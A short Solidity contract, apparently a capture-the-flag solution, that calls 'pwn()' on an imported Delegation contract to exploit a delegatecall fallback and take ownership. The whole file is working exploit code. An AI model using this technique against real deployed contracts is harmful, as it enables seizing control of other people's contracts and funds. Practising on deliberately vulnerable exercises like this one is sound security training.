// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public hackContractAddress;
        constructor(address _hackContractAddress){
            hackContractAddress = _hackContractAddress;
        }

    function hackContract() external {
        hackContractAddress.call(abi.encodeWithSelector(bytes4(keccak256("pwn()"))));

    }
}
